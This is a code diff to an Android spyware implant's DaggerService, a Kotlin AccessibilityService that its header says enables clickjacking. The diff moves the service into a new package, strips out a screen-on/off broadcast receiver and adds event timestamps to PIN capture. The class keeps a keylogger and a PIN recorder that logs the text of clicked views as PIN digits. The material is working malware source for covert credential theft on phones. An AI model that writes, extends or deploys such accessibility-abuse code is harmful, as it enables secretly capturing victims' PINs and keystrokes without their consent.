@@ -9,16 +9,18 @@
 * This service also registers a BroadcastReceiver that listens for screen on and off events to
 * enable ClickJacking.
 * */
-package com.cooperthecoder.implant
+package com.cooperthecoder.implant.dagger
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
-import android.content.BroadcastReceiver
-import android.content.Intent
-import android.content.IntentFilter
 import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import com.cooperthecoder.implant.Config
+import com.cooperthecoder.implant.data.SharedPreferencesQuery
+import com.cooperthecoder.implant.selected
+import com.cooperthecoder.implant.strings
+import com.cooperthecoder.implant.uris
 
 class DaggerService : AccessibilityService() {
 
@@ -33,7 +35,6 @@ class DaggerService : AccessibilityService() {
 
     lateinit var pinRecorder: PinRecorder
     lateinit var keyLogger: KeyLogger
-    lateinit var receiver: BroadcastReceiver
 
     override fun onCreate() {
         super.onCreate()
@@ -47,7 +48,6 @@ class DaggerService : AccessibilityService() {
         })
 
         keyLogger = KeyLogger()
-        receiver = ScreenStateReceiver()
     }
 
     override fun onInterrupt() {
@@ -62,7 +62,7 @@ class DaggerService : AccessibilityService() {
                     AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                         logEvent(event, event.className.toString())
                         // This is a PIN, let's record it.
-                        pinRecorder.appendPinDigit(event.text.toString())
+                        pinRecorder.appendPinDigit(event.text.toString(), event.eventTime)
                     }
                 }
             }
@@ -113,7 +113,6 @@ class DaggerService : AccessibilityService() {
     override fun onServiceConnected() {
         super.onServiceConnected()
         serviceInfo = accessibilityServiceInfo()
-        registerScreenStateReceiver(receiver)
         running = true
         Log.d(TAG, "DaggerService started.")
     }
@@ -121,7 +120,6 @@ class DaggerService : AccessibilityService() {
 
     override fun onDestroy() {
         super.onDestroy()
-        unregisterReceiver(receiver)
         running = false
         Log.d(TAG, "Stopping DaggerService.")
     }
@@ -144,13 +142,6 @@ class DaggerService : AccessibilityService() {
                 AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
         return info
-    }
-
-    private fun registerScreenStateReceiver(receiver: BroadcastReceiver) {
-        val intentFilter = IntentFilter(Intent.ACTION_SCREEN_ON)
-        intentFilter.addAction(Intent.ACTION_SCREEN_OFF)
-        registerReceiver(receiver, intentFilter)
-        Log.d(TAG, "Registering screen state listener")
     }
 
     private fun logEvent(event: AccessibilityEvent, message: String) {
